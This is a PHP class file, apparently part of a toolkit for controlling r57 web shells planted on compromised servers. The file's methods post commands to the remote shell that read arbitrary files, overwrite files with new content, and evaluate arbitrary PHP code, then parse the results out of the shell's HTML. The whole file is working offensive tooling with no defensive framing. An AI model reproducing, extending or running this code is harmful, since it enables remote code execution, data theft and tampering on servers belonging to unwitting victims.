<?php

class RemoteShell_r57 extends RemoteShell
{
	/**
	 * @return ShellType
	 */
	public function getShellType() {
		return ShellType::getInstance()->fetchByKey('r57');
	}


	/**
	 * @param Zend_Http_Response Server response
	 * @return string
	 */
	public function getError($response)
	{
		parent::_checkResponse($response);

		$body = $response->getBody();
		$match = array();
		preg_match(
			'|\<font\scolor\=red\sface\=Verdana\ssize\=\-2\>\<div\salign\=center\>\<b\>(.+?)\<\/b\>|is',
			$body, $match);

		if (isset($match[1])) {
			$error = $match[1];
			if (strstr($body, 'windows-1251')) {
				$error = mb_convert_encoding($error, 'UTF-8', 'windows-1251');
			}

			return $error;
		}

		return null;
	}

	/**
	 * Return full file content getting by remote shell.
	 *
	 * @param string $path Full path to remote file
	 * @return string Content of file
	 */
	public function _fileGetContents($path)
	{
		$client = $this->_getClient();

		// Query to shell for editing file
		$client->setParameterPost('e_name', $path);
		$client->setParameterPost('cmd', 'edit_file');
		$client->setParameterPost('submit', true);
		$response = $client->request(Zend_Http_Client::POST);

		$error = $this->getError($response);
		if ($error) {
			throw new RemoteShell_FileException('Remote shell error: ' . $error);
		}

		$match = array();
		preg_match ('|\<textarea.+?name=e_text.+?\>(.*)\<\/textarea\>|is', $response->getBody(), $match);
		if (!isset($match[1])) {
			throw new RemoteShell_FileException('Cant find page content into shell response');
		}

		return htmlspecialchars_decode($match[1]);
	}

	/**
	 * Write content into file on remote shell
	 *
	 * @param string $path Full path to remote file
	 * @param string $content Content for write to file
	 * @return boolean
	 */
	public function _filePutContents($path, $content)
	{
		$client = $this->_getClient();

		// Query to shell for editing file
		$client->setParameterPost('e_name', $path);
		$client->setParameterPost('e_text', $content);
		$client->setParameterPost('cmd', 'save_file');

		$client->setParameterPost('submit', true);
		$response = $client->request(Zend_Http_Client::POST);

		$error = $this->getError($response);
		if ($error) {
			throw new RemoteShell_FileException('Remote shell error: ' . $error);
		}

		return true;
	}

	/**
	 * Eval php code on shell
	 *
	 * @param string $code PHP code
	 * @return string PHP response
	 */
	public function _evalPhp($code)
	{
		$client = $this->_getClient();
		$client->setParameterPost('php_eval', $code);
		$client->setParameterPost('submit', true);
		$client->setParameterPost('cmd', 'php_eval');
		$response = $client->request(Zend_Http_Client::POST);

		preg_match ('|\<textarea.+?name=report.+?\>(.*?)\<\/textarea\>|is', $response->getBody(), $match);
		if (!isset($match[1])) {
			throw new RemoteShell_FileException('Cant find php response into shell response');
		}
		$error = $this->getError($response);
		if ($error) {
			throw new RemoteShell_FileException('Remote shell error: ' . $error);
		}

		return htmlspecialchars_decode($match[1]);
	}
}